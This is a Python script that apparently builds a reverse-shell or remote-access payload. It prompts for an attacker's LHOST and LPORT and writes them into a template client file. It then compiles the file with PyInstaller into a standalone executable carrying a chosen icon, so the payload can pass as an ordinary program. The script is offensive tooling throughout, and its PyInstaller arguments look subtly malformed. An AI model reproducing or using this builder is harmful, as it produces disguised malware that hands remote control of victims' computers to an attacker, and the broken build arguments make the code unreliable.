import subprocess
from shutil import copyfile
import os
import socket
import base64
import sys
import pickle
import time

GREEN = '\33[32m'
RED = '\33[31m'
END = '\33[0m'
BOLD = '\33[1m'

try:
    import PyInstaller
except ImportError as e:
    print(RED + BOLD + "Please install PyInstaller with 'pip install pyinstaller'")
    sys.exit(1)

#print(GREEN + BOLD + "\nThis isn't set up yet! Very soon... Please use the 'client.py' with the github instructions instead.\n" + END)

print('                     ')

host = input(GREEN + BOLD + 'Set LHOST IP: ' + END)
port = input(GREEN + BOLD + 'Set LPORT: ' + END)
name = input(GREEN + BOLD + 'Enter the basename for output files: ' + END)

def createFile():
    try:
        global copiedFile
        print(GREEN + BOLD + '\nCreating python file...\n')
        time.sleep(2)
        exampleFile = os.getcwd() + '/source/example.py'
        copiedFile = os.getcwd() + '/output/' + name + '.py'
        copyfile(exampleFile, copiedFile)
        with open(copiedFile, 'r') as file:
            filedata = file.read()
        replaceHOST = "host = '" + host + "'"
        filedata = filedata.replace("host = ''", replaceHOST)
        with open(copiedFile, 'w') as file:
            file.write(filedata)

        with open(copiedFile, 'r') as file:
            filedata = file.read()
        replacePORT = "port = " + port
        filedata = filedata.replace("port = ''", replacePORT)
        with open(copiedFile, 'w') as file:
            file.write(filedata)
    except:
        print(RED + BOLD + "Couldn't create python file. Quitting...")
        sys.exit()

def pythonToExe():
    try:
        ico = input('\n' + GREEN + BOLD + 'Path to icon file:')
        print(GREEN + BOLD + '\nGenerating exe file...\n')
        p = subprocess.Popen(['pyinstaller', '-y', '-F', 'w', 'i', ico, '-n', name, copiedFile], cwd = 'output/')
        p.wait()
    except:
        print(RED + BOLD + "Couldn't create exe file. Quitting...")
        sys.exit()

def done():
    time.sleep(2)
    print(GREEN + BOLD + "\nDone! Saved to the 'dist' directory in the output folder!")
    time.sleep(2)

def main():
    createFile()
    pythonToExe()
    done()

if __name__ == "__main__":
    main()
